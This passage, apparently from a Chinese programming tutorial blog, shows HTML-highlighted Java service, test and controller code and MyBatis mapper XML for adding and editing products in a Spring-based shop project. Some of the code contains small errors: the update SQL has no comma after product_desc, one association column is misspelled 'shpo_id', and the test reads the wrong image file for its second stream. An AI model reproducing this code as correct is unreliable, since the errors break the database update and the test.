PathUtil.getShopImagePath(product.getShop().getShopId());<span class="hljs-type">String</span> <span class="hljs-variable">thumbnailAddr</span> <span class="hljs-operator">=</span> ImageUtil.generateThumbnail(thumbnail, dest);product.setImgAddr(thumbnailAddr);&#125;<span class="hljs-comment">/**</span><span class="hljs-comment"> * 批量添加图片</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> product</span><span class="hljs-comment"> * <span class="hljs-doctag">@param</span> productImgHolder</span><span class="hljs-comment"> */</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">addProductImgList</span><span class="hljs-params">(Product product, List&lt;ImageHolder&gt; productImgHolderList)</span> &#123;<span class="hljs-comment">// 获取图片存储路径，这里直接存放到相应店铺的文件夹地下</span><span class="hljs-type">String</span> <span class="hljs-variable">dest</span> <span class="hljs-operator">=</span> PathUtil.getShopImagePath(product.getShop().getShopId());List&lt;ProductImg&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ProductImg&gt;();<span class="hljs-comment">// 遍历图片一次去处理，并添加进 productImg 实体类里</span><span class="hljs-keyword">for</span>(ImageHolder productImgHolder: productImgHolderList) &#123;<span class="hljs-type">String</span> <span class="hljs-variable">imgAddr</span> <span class="hljs-operator">=</span> ImageUtil.generateNormalImg(productImgHolder, dest);<span class="hljs-type">ProductImg</span> <span class="hljs-variable">productImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductImg</span>();productImg.setImgAddr(imgAddr);productImg.setProductId(product.getProductId());productImg.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());productImgList.add(productImg);&#125;<span class="hljs-comment">// 如果确实是有图片需要添加的，就执行批量添加操作</span><span class="hljs-keyword">if</span>(productImgList.size() &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productImgDao.batchInsertProductImg(productImgList);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;创建商品详情图片失败&quot;</span>);&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;创建商品详情图片失败:&quot;</span> + e.toString());&#125;&#125;&#125;<span class="hljs-meta">@Override</span><span class="hljs-meta">@Transactional</span> <span class="hljs-comment">// 通过spring的事务管理，去管理以下4个步骤，其中任何一步出错了就会回滚数据</span><span class="hljs-comment">/**</span><span class="hljs-comment"> * 方法步骤：</span><span class="hljs-comment"> * 1. 处理缩略图，获取缩略图相对路径并赋值给product(和注册店铺差不多)</span><span class="hljs-comment"> * 2. 往 tb_product 写入商品信息，成功获取 productId(因为在mapper 使用了 useGeneratedKeys=&quot;true&quot;)</span><span class="hljs-comment"> * 3. 结合 productId 批量处理商品详情图</span><span class="hljs-comment"> * 4. 将商品详情列表批量插入 tb_product_img中</span><span class="hljs-comment"> */</span><span class="hljs-keyword">public</span> ProductExecution <span class="hljs-title function_">addProduct</span><span class="hljs-params">(Product product, ImageHolder thumbnail, List&lt;ImageHolder&gt; productImgHolderList)</span><span class="hljs-keyword">throws</span> ProductOperationException &#123;<span class="hljs-comment">// 空值判断</span><span class="hljs-keyword">if</span>(product != <span class="hljs-literal">null</span> &amp;&amp; product.getShop() != <span class="hljs-literal">null</span> &amp;&amp; product.getShop().getShopId() != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 给商品设置上默认属性</span>product.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product.setLastEditTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());<span class="hljs-comment">// 默认为上架的状态</span>product.setEnableStatus(<span class="hljs-number">1</span>);<span class="hljs-comment">// 若商品缩略图不为空则添加</span><span class="hljs-keyword">if</span>(thumbnail != <span class="hljs-literal">null</span>) &#123;addThumbnail(product, thumbnail);&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 创建商品信息</span><span class="hljs-type">int</span> <span class="hljs-variable">effectedNum</span> <span class="hljs-operator">=</span> productDao.insertProduct(product);<span class="hljs-keyword">if</span>(effectedNum &lt;= <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;创建商品失败&quot;</span>);&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;<span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductOperationException</span>(<span class="hljs-string">&quot;创建商品失败:&quot;</span> + e.toString());&#125;<span class="hljs-comment">// 若商品详情图不为空则添加</span><span class="hljs-keyword">if</span>(productImgHolderList != <span class="hljs-literal">null</span> &amp;&amp; productImgHolderList.size() &gt; <span class="hljs-number">0</span>) &#123;addProductImgList(product, productImgHolderList);&#125;<span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductExecution</span>(ProductStateEnum.SUCCESS, product);&#125; <span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 传参为空则返回空值错误信息</span><span class="hljs-keyword">return</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductExecution</span>(ProductStateEnum.EMPTY_LIST);&#125;&#125;&#125;language-java复制代码</code></pre><ol><li>单元测试</li></ol><pre><code class="hljs java"><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductServiceTest</span> <span class="hljs-keyword">extends</span> <span class="hljs-title class_">BaseTest</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductService productService;<span class="hljs-meta">@Test</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">testAddProduct</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> ShopOperationException, FileNotFoundException&#123;<span class="hljs-comment">// 创建shopId 为1且productCategoryId为1的商品实例并给其成员变量赋值</span><span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Product</span>();<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(<span class="hljs-number">1L</span>);<span class="hljs-type">ProductCategory</span> <span class="hljs-variable">pc</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ProductCategory</span>();pc.setProductCategoryId(<span class="hljs-number">1L</span>);product.setShop(shop);product.setProductCategory(pc);product.setProductName(<span class="hljs-string">&quot;测试商品1&quot;</span>);product.setProductDesc(<span class="hljs-string">&quot;测试商品1&quot;</span>);product.setPriority(<span class="hljs-number">20</span>);product.setCreateTime(<span class="hljs-keyword">new</span> <span class="hljs-title class_">Date</span>());product.setEnableStatus(ProductStateEnum.SUCCESS.getState());<span class="hljs-comment">// 创建缩略图文件流</span><span class="hljs-type">File</span> <span class="hljs-variable">thumbnailFile</span> <span class="hljs-operator">=</span><span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(thumbnailFile);<span class="hljs-type">ImageHolder</span> <span class="hljs-variable">thumbnail</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(thumbnailFile.getName(), is);<span class="hljs-comment">// 创建两个商品详情图片文件流并将他们添加到详情图列表中</span><span class="hljs-type">File</span> <span class="hljs-variable">productImg1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is1</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(productImg1);<span class="hljs-type">File</span> <span class="hljs-variable">productImg2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">File</span>(<span class="hljs-string">&quot;/Users/jxh/Downloads/src2.jpeg&quot;</span>);<span class="hljs-type">InputStream</span> <span class="hljs-variable">is2</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(productImg1);List&lt;ImageHolder&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ImageHolder&gt;();productImgList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImg1.getName(),is1));productImgList.add(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImg2.getName(),is2));<span class="hljs-comment">// 添加商品并验证</span><span class="hljs-type">ProductExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productService.addProduct(product, thumbnail, productImgList);assertEquals(ProductStateEnum.SUCCESS.getState(), pe.getState());&#125;&#125;language-java复制代码</code></pre><h4 id="6-1-3-controller-层"><a href="#6-1-3-controller-层" class="headerlink" title="6.1.3 controller 层"></a>6.1.3 controller 层</h4><pre><code class="hljs java"><span class="hljs-meta">@Controller</span><span class="hljs-meta">@RequestMapping(&quot;/shopadmin&quot;)</span><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">ProductManagementController</span> &#123;<span class="hljs-meta">@Autowired</span><span class="hljs-keyword">private</span> ProductService productService;<span class="hljs-comment">// 支持上次商品详情图的最大数量</span><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">final</span> <span class="hljs-type">int</span> <span class="hljs-variable">IMAGEMAXCOUNT</span> <span class="hljs-operator">=</span> <span class="hljs-number">6</span>;<span class="hljs-meta">@RequestMapping(value = &quot;/addproduct&quot;, method = RequestMethod.POST)</span><span class="hljs-meta">@ResponseBody</span><span class="hljs-keyword">private</span> Map&lt;String, Object&gt; <span class="hljs-title function_">addProduct</span><span class="hljs-params">(HttpServletRequest request)</span> &#123;Map&lt;String, Object&gt; modelMap = <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>&lt;String, Object&gt;();<span class="hljs-comment">// 验证码校验</span><span class="hljs-keyword">if</span>(!CodeUtil.checkVerifyCode(request)) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;输入了错误的验证码&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 接受前端参数的变量的初始化，包括商品，缩略图，详情图列表实体类</span><span class="hljs-type">ObjectMapper</span> <span class="hljs-variable">mapper</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectMapper</span>();<span class="hljs-type">Product</span> <span class="hljs-variable">product</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-type">String</span> <span class="hljs-variable">productStr</span> <span class="hljs-operator">=</span> HttpServletRequestUtil.getString(request, <span class="hljs-string">&quot;productStr&quot;</span>);<span class="hljs-type">MultipartHttpServletRequest</span> <span class="hljs-variable">multipartRequest</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;<span class="hljs-type">ImageHolder</span> <span class="hljs-variable">thumbnail</span> <span class="hljs-operator">=</span> <span class="hljs-literal">null</span>;List&lt;ImageHolder&gt; productImgList = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;ImageHolder&gt;();<span class="hljs-type">CommonsMultipartResolver</span> <span class="hljs-variable">multipartResolver</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CommonsMultipartResolver</span>(request.getSession().getServletContext());<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 若请求中存在文件流，则取出相关的文件（包括缩略图和详情图）</span><span class="hljs-keyword">if</span>(multipartResolver.isMultipart(request)) &#123;multipartRequest = (MultipartHttpServletRequest) request;<span class="hljs-comment">// 取出缩略图并构建 ImageHolder对象</span><span class="hljs-type">CommonsMultipartFile</span> <span class="hljs-variable">thumbnailFile</span> <span class="hljs-operator">=</span> (CommonsMultipartFile) multipartRequest.getFile(<span class="hljs-string">&quot;thumbnail&quot;</span>);thumbnail = <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(thumbnailFile.getOriginalFilename(), thumbnailFile.getInputStream());<span class="hljs-comment">// 取出详情图列表并构建List&lt;ImageHolder&gt;列表对象，最多支持六张图片上传</span><span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> <span class="hljs-variable">i</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>; i &lt; IMAGEMAXCOUNT; i++) &#123;<span class="hljs-type">CommonsMultipartFile</span> <span class="hljs-variable">productImgFile</span> <span class="hljs-operator">=</span> (CommonsMultipartFile) multipartRequest.getFile(<span class="hljs-string">&quot;productImg&quot;</span> + i);<span class="hljs-keyword">if</span>(productImgFile != <span class="hljs-literal">null</span>) &#123;<span class="hljs-comment">// 若取出的第i个详情图片文件流不为空，则将其加入详情图列表</span><span class="hljs-type">ImageHolder</span> <span class="hljs-variable">productImg</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ImageHolder</span>(productImgFile.getOriginalFilename(), productImgFile.getInputStream());productImgList.add(productImg);&#125;<span class="hljs-keyword">else</span> &#123;<span class="hljs-comment">// 若取出的第i个详情图片文件流为空，则终止循环</span><span class="hljs-keyword">break</span>;&#125;&#125;&#125;<span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;上传图片不能为空&quot;</span>);<span class="hljs-keyword">return</span> modelMap;&#125;&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 尝试获取前端传过来的表单string流并将其转换成 Product实体类</span>product = mapper.readValue(productStr, Product.class);&#125; <span class="hljs-keyword">catch</span>(Exception e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;<span class="hljs-comment">// 若Product信息，缩略图以及详情图聊表为空，则开始进行商品添加操作</span><span class="hljs-keyword">if</span>(product != <span class="hljs-literal">null</span> &amp;&amp; thumbnail != <span class="hljs-literal">null</span> &amp;&amp; productImgList.size() &gt; <span class="hljs-number">0</span>) &#123;<span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// 从session 中获取当前店铺的Id 并赋值给 product, 减少对前端数据的依赖</span><span class="hljs-type">Shop</span> <span class="hljs-variable">currentShop</span> <span class="hljs-operator">=</span> (Shop) request.getSession().getAttribute(<span class="hljs-string">&quot;currentShop&quot;</span>);<span class="hljs-type">Shop</span> <span class="hljs-variable">shop</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">Shop</span>();shop.setShopId(currentShop.getShopId());product.setShop(shop);<span class="hljs-comment">// 执行添加操作</span><span class="hljs-type">ProductExecution</span> <span class="hljs-variable">pe</span> <span class="hljs-operator">=</span> productService.addProduct(product, thumbnail, productImgList);<span class="hljs-keyword">if</span>(pe.getState() == ProductStateEnum.SUCCESS.getState()) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">true</span>);&#125;<span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, pe.getStateInfo());&#125;&#125; <span class="hljs-keyword">catch</span>(ProductOperationException e) &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, e.toString());<span class="hljs-keyword">return</span> modelMap;&#125;&#125; <span class="hljs-keyword">else</span> &#123;modelMap.put(<span class="hljs-string">&quot;success&quot;</span>, <span class="hljs-literal">false</span>);modelMap.put(<span class="hljs-string">&quot;errMsg&quot;</span>, <span class="hljs-string">&quot;请输入商品信息&quot;</span>);&#125;<span class="hljs-keyword">return</span> modelMap;&#125;&#125;language-java复制代码</code></pre><h2 id="6-2-商品编辑"><a href="#6-2-商品编辑" class="headerlink" title="6.2 商品编辑"></a>6.2 商品编辑</h2><p>目标：实现商品的编辑功能（可以借鉴商品的添加和店铺的编辑）；明确如何处理已存在的图片(如果有上传新的缩略图或详情图，就把之前的图片删除掉)。<br>思路：获取商品信息，传入新的图片就把之前的图片删除，提交按钮修改商品信息。</p><h4 id="6-2-1、dao-层"><a href="#6-2-1、dao-层" class="headerlink" title="6.2.1、dao 层"></a>6.2.1、dao 层</h4><ol><li>接口 ProductDoa.java; ProductImgDao.java</li></ol><p>获取商品信息：Product queryProductById(long productId),<br>修改商品信息：int updateProduct(Product product);</p><p>删除商品图片：int deleteProductImgByProductId(long productId); 2. mapper ProductDao.xml &amp; ProductImgDao.xml</p><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">mapper</span> <span class="hljs-keyword">PUBLIC</span> <span class="hljs-string">&quot;-//mybatis.org//DTD Mapper 3.0//EN&quot;</span> <span class="hljs-string">&quot;http://mybatis.org/dtd/mybatis-3-mapper.dtd&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">mapper</span> <span class="hljs-attr">namespace</span>=<span class="hljs-string">&quot;com.imooc.o2o.dao.ProductDao&quot;</span>&gt;</span><span class="hljs-comment">&lt;!-- 复合数据类型(返回商品的信息和商品详情图的信息) 接口:Product queryProductById(long productId) --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">resultMap</span> <span class="hljs-attr">type</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Product&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">id</span>=<span class="hljs-string">&quot;productMap&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_desc&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productDesc&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;img_addr&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;imgAddr&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;normal_price&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;normalPrice&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;promotion_price&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;promotionPrice&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;priority&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;priority&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;last_edit_time&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;lastEditTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;enable_status&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;enableStatus&quot;</span> /&gt;</span><span class="hljs-comment">&lt;!--assocication可以指定联合的JavaBean对象; property=&quot;role&quot;指定哪个属性是联合的对象; javaType:指定这个属性对象的类型 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_category_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productCategory&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.ProductCategory&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_category_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productCategoryId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_category_name&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productCategoryName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">association</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shop&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shpo_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">javaType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Shop&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;owner_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;ownerId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;shop_name&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;shopName&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">association</span>&gt;</span><span class="hljs-comment">&lt;!-- 一对多的关系 List&lt;ProductImgList&gt; --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">collection</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImgList&quot;</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">ofType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.ProductImg&quot;</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">id</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_img_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productImgId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;detail_img&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;imgAddr&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;img_desc&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;imgDesc&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;priority&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;priority&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;create_time&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;createTime&quot;</span> /&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">result</span> <span class="hljs-attr">column</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">property</span>=<span class="hljs-string">&quot;productId&quot;</span> /&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">collection</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">resultMap</span>&gt;</span><span class="hljs-comment">&lt;!-- 根据 product id 查询商品信息 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">select</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;queryProductById&quot;</span> <span class="hljs-attr">resultMap</span>=<span class="hljs-string">&quot;productMap&quot;</span></span><span class="hljs-tag"><span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;Long&quot;</span>&gt;</span>SELECTp.product_id,p.product_name,p.product_desc,p.img_addr,p.normal_price,p.promotion_price,p.priority,p.create_time,p.last_edit_time,p.enable_status,p.product_category_id,p.shop_id,pm.product_img_id,pm.img_addr AS detail_img,pm.img_desc,pm.priority,pm.create_timeFROMtb_product pLEFT JOINtb_product_img pmONp.product_id=pm.product_idWHEREp.product_id=#&#123;productId&#125;ORDER BYpm.priority DESC<span class="hljs-tag">&lt;/<span class="hljs-name">select</span>&gt;</span><span class="hljs-comment">&lt;!-- 更新店铺的信息 --&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">update</span> <span class="hljs-attr">id</span>=<span class="hljs-string">&quot;updateProduct&quot;</span> <span class="hljs-attr">parameterType</span>=<span class="hljs-string">&quot;com.imooc.o2o.entity.Product&quot;</span> <span class="hljs-attr">keyProperty</span>=<span class="hljs-string">&quot;product_id&quot;</span> <span class="hljs-attr">useGeneratedKeys</span>=<span class="hljs-string">&quot;true&quot;</span>&gt;</span>UPDATE tb_product<span class="hljs-tag">&lt;<span class="hljs-name">set</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;productName != null&quot;</span>&gt;</span>product_name=#&#123;productName&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;productDesc != null&quot;</span>&gt;</span>product_desc=#&#123;productDesc&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;imgAddr != null&quot;</span>&gt;</span>img_addr=#&#123;imgAddr&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;normalPrice != null&quot;</span>&gt;</span>normal_price=#&#123;normalPrice&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;promotionPrice != null&quot;</span>&gt;</span>promotion_price=#&#123;promotionPrice&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;priority != null&quot;</span>&gt;</span>priority=#&#123;priority&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;lastEditTime != null&quot;</span>&gt;</span>last_edit_time=#&#123;lastEditTime&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;enableStatus != null&quot;</span>&gt;</span>enable_status=#&#123;enableStatus&#125;,<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;<span class="hljs-name">if</span> <span class="hljs-attr">test</span>=<span class="hljs-string">&quot;productCategory != null and productCategory.productCategoryId != null&quot;</span>&gt;</span>product_category_id=#&#123;productCategory.productCategoryId&#125;<span class="hljs-tag">&lt;/<span class="hljs-name">if</span>&gt;</span><span class="hljs-tag">&lt;/<span class="hljs-name">set</span>&gt;</span>WHERE 